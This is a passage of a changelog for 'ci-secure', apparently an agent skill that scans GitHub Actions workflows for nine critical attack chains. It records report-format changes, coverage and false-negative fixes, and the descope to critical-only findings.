  scope-honesty line five; the `Findings` and `Scope` provenance rows are
  gone (the banner, headline, Catalog row and Methodology table still carry
  both), and the standalone `**Network-gated checks.**` bullet list no longer
  reprints the `[!WARNING]` callout's own bullets byte-for-byte.
- **The Fix heading is `#### 🛠️ Fix`, not `#### 🟢 Fix`** — 🟢 means
  "runner-minute saving" in ci-speedup, and one glyph must not carry two
  meanings across two reports.
- **Each finding's anchor precedes its heading** (ci-speedup's placement), so
  a `#finding-N` jump lands on the title instead of scrolling it out of view.
- **The copy-prompt block is `🤖 Prompt for your coding agent`** (ci-speedup's
  name), still collapsed (ci-score's treatment).
- **Every fix prompt ends with a verification oracle** — re-run the scan and
  confirm the chain no longer fires — as both siblings' prompts do.
- **Cosmetics toward the siblings:** `## 🗄️ Data sources` and its `Used for`
  column are sentence-case; the audited-commit row carries ci-speedup's
  "file & line references are anchored to this tree" clause (ci-secure is the
  only one of the three emitting file:line permalinks); the per-bullet
  `(commit abc1234)` suffix is gone (the header and the permalink already say
  it); and the chain map's ✅ rows link to their appendix entries.

### Removed
- **Absolute scratch paths in the saved report.** The `_Showing 3 of 13…_`
  note pointed at `/private/tmp/…/ci-secure-findings-<slug>.json`, a file the
  OS garbage-collects; it names the findings JSON by role and basename now.
  The "render every occurrence" prompt is suppressed entirely when every
  occurrence is already shown.

### Added
- **Five `verify_report.py` invariants** for the above: chain anchors resolve,
  every finding anchor precedes its heading, no detail bullet spills a bare
  continuation line, no absolute scratch path in the report's prose, and the
  `Scanned` row carries a well-formed date.

## 2026-08-01 — Report adopts the sibling house format

The report now reads like its siblings (ci-score, ci-speedup) rather than a
third format: same section skeleton, same title shape, same provenance table,
same pre-drawn banner, same stakes-first recommendation opening. The skeleton
is `headline → chain map → one section per finding → what each chain checks →
reference appendices`.

### Removed
- **The `## ✅ Action plan` and `## 📊 Executive summary` sections.** Neither
  sibling has either — the severity-ranked order of the finding sections IS
  the action plan, and a duplicate ranked list up top is a second place for
  that ordering to drift from the body. The load-bearing sentences moved
  rather than vanished: the counting sentence (occurrences vs. distinct
  chains) rides under the headline, the "every finding renders, nothing is
  trimmed" contract sits under the chain map, and each finding's curated
  action verb opens its Fix block as `**Do this:** …`.

### Added
- **A `## Critical findings: **N** — M of 9 chains hit` headline** (ci-score's
  `## CI Score: **75/100** — …` shape). Zero findings reads
  `**0** — no chain matched` and folds the positive verdict under the same
  headline instead of a separate section.
- **A `## 📖 What each chain checks` appendix** — one line per chain, from
  each catalog entry's own TL;DR, so a ✅ chain-map row is a falsifiable
  claim rather than an assertion (ci-score's "What each check means").
- **A pre-drawn banner** under the provenance table — e.g.
  `CI Secure   4 critical findings  ▏2 of 9 chains hit▕  31 workflows ·
  impostor check ran`. `report.py` draws it; the orchestrator copies it
  verbatim as the first line of the terminal summary and never redraws it. It
  reflects the impostor check's real state (`ran` / `partial` / `SKIPPED` /
  `not recorded`), so the one line most readers see cannot dress a skip up as
  a pass. `verify_report.py` binds its numbers to the header and the chain
  table.
- **A `## 🔗 Chain map — all nine` table**, including the chains that
  came back clean — a findings table alone cannot distinguish "checked and
  clean" from "never checked". A hit row links its finding; the network-gated
  chain renders ⚠️ and says it is not a pass when it did not run.
- **A `Risk of the change:` line on every fix**, authored per pattern in the
  catalog as a new required `**Risk of the change.**` marker (five markers
  now, censused). It renders under the Fix block and rides along in the
  copy-prompt constraints so a fix subagent sees what the change could break.
- **A stakes-first one-liner** opening each finding, derived from that
  finding's own attacker text.
- **A dirty-tree caveat on the audited commit.** `scan.py` records
  `repo_tree_dirty`; when the audited checkout had uncommitted changes, the
  commit row says the scanned bytes may not match the linked commit.

### Changed
- **The title is a question** — `# {owner/repo} — any critical exploit chains
  in your CI?`
- **The provenance table is label-style** (no `| Field | Value |` header row),
  with `Audited commit` / `Workflows scanned` / `Catalog` / `Scanned` rows; the
  scope line renders as the headline blockquote as well as a table row.
- **Findings are top-level sections carrying their magnitude** —
  `## 🟥 Finding 1: Template injection in run: blocks — 2 sites / 2 workflows`
  (was `### Finding 1: …`), so headings alone size the work. SKILL.md's
  Phase 5 `FIXED — ` marking now targets the `## ` heading.
- The worked examples kept during development were re-rendered in the new
  format. They are not part of the installed skill.

## 2026-08-01 — Review-batch hardening: fail-closed coverage, honest degradation

Consolidates four review reports against the critical-only descope. Two of the
fixes below closed reproduced false negatives — scans that reported clean while
a check had not run.

### Fixed
- **A broken catalog entry is now a loud exit, not a deleted chain.** A typo in
  a METADATA block, a `correlation:` id, or a `file_check:` id used to log a
  warning and `continue` — the chain then never ran, produced no findings, and
  the report said the repo was clean of a pattern nobody evaluated. The loader
  is strict and `scan.py` exits 1 telling the user to reinstall. The scan output
  also stamps `catalog_patterns_evaluated`, which `verify_report.py` compares
  against the nine-chain manifest so a silently-shrunk catalog goes red.
- **A glob metacharacter in the repo's path no longer hides every workflow.** A
  checkout under a directory named e.g. `repo[1]` was interpolated straight into
  the discovery glob, read as a character class, and matched nothing: zero files
  scanned, no error, a clean report. The root is escaped, and discovery finding
  nothing while `.github/workflows/` plainly holds YAML is now a coverage
  failure (exit 1) rather than a clean result.
- **A partial impostor-SHA run no longer renders as a passed check.** When some
  pins could not be resolved (network, rate limit, a repo this identity cannot
  see), the status still began `ran:` and rendered with a ✅ — "verified"
  asserted of pins nobody checked. Unresolved pins produce a `partial:` status,
  render inside the same `[!WARNING]` callout as a skip, and each unverified pin
  is named with its `file:line`.
- **A failed run can no longer leave stale findings at the fixed path.**
  `run.py` clears `--out` before scanning, so the file SKILL.md promises is
  absent after a failure really is — previously a prior run's findings sat
  there, ready to be rendered as this repo's.
- **`--gh-impostor off` is no longer reported as "gh unavailable".** The two
  skip reasons are distinct, and the report only suggests `gh auth login` for
  the unauthenticated one.
- **The last catalog pattern no longer swallows `## Reference incidents`.** A
  pattern section ends at the next `### P` *or* the next `## ` heading, so
  P14.24's rendered finding stops citing eight incidents belonging to other
  chains.
- **Catalog prose that fails to parse says so.** A missing `**TL;DR.**` used to
  render the section's anti-pattern text under the TL;DR label — mislabeled
  content a reader cannot distinguish from the real thing. Missing markers now
  log a warning and render an explicit parse-failure note; a missing fix recipe
  is no longer described as a non-YAML org setting.
- **A failed workflow-activity lookup is recorded as unavailable, not `{}`.**
  `{}` means "never attempted", which the report reads as no-data — so a
  rate-limited workflow looked no different from an unenriched one.

### Changed
- **P14.10 no longer matches bare `inputs.*`.** It resolves to a
  `workflow_call` input, which only someone with write access to a workflow
  file can set — an insider, outside the catalog's outsider-chain admission
  test. `workflow_dispatch` inputs stay in scope via `github.event.inputs.*`.
- `report.py --render-plan` emits `[{"pattern", "dormant"}]` in render order;
  list position is the group's report ordinal, and SKILL.md Phase 4 builds the
  selection table from it so its numbering cannot drift from the report's.
  `run.py`'s stdout is documented as an unordered presence list.
- P14.7 and P14.18 titles drop the stale "Manual review:" prefix and name the
  workflow file.
- Catalog accuracy pass: severity-scale prose matches the catalog (8 HIGH, 1
  MEDIUM), the untrusted-trigger set and `pull-requests: write` scope rule match
  the detector, P14.19's path limitations and P14.7's composite-action blind
  spot are stated rather than implied, and conditional "Severity" blocks are
  relabelled **Prioritization** so they never contradict the rendered Severity.
  Every reference to a pattern the descope removed is gone, and two dangling
  table-of-contents anchors are fixed.
- The worked examples kept during development are regenerated under the
  nine-chain contract (they were pre-descope artifacts carrying zizmor findings and removed
  patterns), each with authored attacker scenarios and `verify_report.py` green.
- Dead renderer code removed: the manual-review appendix (no shipped pattern is
  `detector: manual`) and four unreferenced activity/anchor helpers.

### Added
- Census tests binding prose to code: `verify_report.py`'s manifest to the
  catalog's, the catalog's severity distribution to its own prose, every
  in-catalog anchor link to a real heading, and every pattern id in a shipped
  doc to a live pattern.
- The install-surface dangling-link guard runs over ci-secure as well as
  ci-speedup, each with its own relocated-infra name set.

## 2026-08-01 — Critical-only descope: the nine attack chains

A deliberate scope change: bare-minimum critical findings over
comprehensiveness.

### Changed
- **The catalog is now exactly nine outsider → compromise chains** (P14.7,
  P14.9, P14.10, P14.11, P14.14, P14.15, P14.18, P14.19, P14.24). Every
  finding renders, every one carries its attacker scenario, zero findings is
  a first-class result — no tiers, no topping-up, no render cut. The
  selection criterion, per-chain incident grounding, and rejection record
  ship in `references/why-these-ten.md` (then named why-these-nine.md),
  census-test-bound to the scanner.
- **P14.9 rebuilt as a real chain detector** ("fork code executed with
  privileges", HIGH): untrusted trigger + checkout of the attacker's head
  ref + execution from the tree, per job — replacing the advisory multi-job
  structural shell. Fixture-proven in both directions.
- **P14.11 gets a first-party, network-gated detector**: every unique
  `owner/repo@sha` pin is verified against the GitHub API (one cached call
  per pin). Runs iff gh is authenticated; the scan output's `gh_checks`
  block and the report state ran/skipped explicitly — a skipped check is
  never a silent pass. Inconclusive (network/rate-limit) is never clean.
- **The report enters the repo only on the user's save pick** (rendered to
  tmp first) — an unasked-for working-tree file poisoned clean-checkout
  provenance downstream.
- Dormant workflows' findings render with a note but are never dropped.
- `run.py` is now a scan-only driver (atomic publish, group-list stdout).
- The findings/report tmp paths are **repo-scoped** (a hash of the repo root
  in the filename): two concurrent ci-secure sessions on different repos can
  no longer clobber each other's findings mid-flight and render the wrong
  repo's report — caught live during an early run.
- The close adopts the ci-speedup/ci-score **interaction contract**
  (feedback from early runs): full findings table in prose, then ONE
  structured question — top fix slots, "a different selection" as the
  door to every row, the verbatim save option last; the save offer is a
  structured two-option question. Free-text replies still work.
- **Apply-risk is communicated, not just attack severity** (feedback from
  early runs): every fix option states what the edit could break if wrong
  and how it will be verified; fixes touching deploy/release/publish
  workflows (or production credentials) are called out in plain words
  with a dry-run recommendation, and fix subagents must state how the
  workflow's intent was preserved. Severity describes the attack; apply
  risk describes the edit.

### Fixed
- **The impostor-SHA check no longer flags what it cannot see.** GitHub
  answers `404` — not `403` — for a repository the caller lacks access to, so
  a private/internal shared-action pin was reported as a CRITICAL impostor
  finding. A cached repo-visibility probe now runs before any flag; an
  invisible repo is inconclusive, never a finding.
- **Pin collection now reads the parsed workflow, not a line scan** — both
  failure directions mattered. A commented-out `# - uses: old/action@<sha>`
  and a `uses:` string quoted inside a `run:` block were sent to the GitHub
  API, where a 404 rendered as a critical finding on a line that pins
  nothing; and a reference not written on one line — a folded scalar, or
  flow style `- {uses: …}` — was never checked at all, which reads as clean.
  Line numbers stay exact by locating the sha itself; an unparseable
  workflow falls back to the line scan rather than dropping its pins.
- **`verify_report.py`'s "every group rendered" check can now go red on a
  trimmed P14.11 group.** It searched the whole report for the pattern id,
  and every report names `P14.11` in its impostor-SHA status line — so the
  one network-gated group was structurally exempt from the no-trimming
  guard. The search is now scoped to the rendered finding sections.
- Rendered reports no longer describe LOW / MANUAL severity tiers the
  nine-chain catalog does not have; the methodology row now states that
  criticality is membership and that nothing is tiered or truncated.
- The catalog's Reference incidents section no longer attributes incidents to
  removed patterns (P14.1, P14.2, P14.6, P5.1, P8.3) that a reader cannot
  resolve, and now carries the Codecov, Chainguard imposter-commit, and
  GitHub Security Lab citations why-these-ten.md (then why-these-nine.md)
  refers to it for. A
  census test keeps every attribution pointing at a live pattern.
- The scenario-authoring guide no longer tells the orchestrator to write
  "there's no real attack here" scenarios (impossible under the critical-only
  catalog) or to generate scenarios for zizmor groups (removed).
- SKILL.md states the zero-findings path explicitly: no empty selection table
  and no "which findings do you want fixed?" prompt when there are none.
- A stale scan test asserted P14.11 was documentation-only and could never
  fire — the opposite of the shipped contract — and asserted on P14.6, a
  removed pattern. Replaced with the honest invariant.

### Removed
- The 18 presence-shaped/blast-radius patterns (unpinned versions, missing
  permissions blocks, OIDC scoping, CODEOWNERS, scanner-installed, release
  hygiene, …): several become scored config facts in the CI Score registry
  (v0.2); the rest are simply not shipped.
  Re-admission requires passing why-these-ten.md's three tests (then named
  why-these-nine.md), guarded by
  the census test.
- zizmor integration (blending, opt-in flow, installer) and fix-complexity
  risk scoring, wholesale.
- Maintainer-only infrastructure is not part of the installable skill
  (an install-surface invariant guards ci-secure too).

## 2026-05-27 — Report bug fixes

- Fixed defects in the rendered security report (severity/scoping and evidence
  presentation), found by review of real runs.

## 2026-05-23 — Initial skill + coverage-gap surfacing

### Added
- The **ci-secure** skill: a deterministic GitHub Actions security audit
  (`scan.py` over the pattern catalog → `report.py`), RCA-style report, no
  commit/push from inside the skill.

### Changed
- **No silent drops:** a workflow dropped from the scan (timeout, parse error)
  must be surfaced loudly as a coverage gap, never reported as "clean" — a
  skipped file shown as clean is a false negative.

## Shared utilities

`gh_utils.py` and `config.py` are shared utility modules: `gh_utils.py` wraps
the `gh` CLI calls the scan makes, and `config.py` holds the settings the scan
reads. Changes to either are noted in the dated entries above.
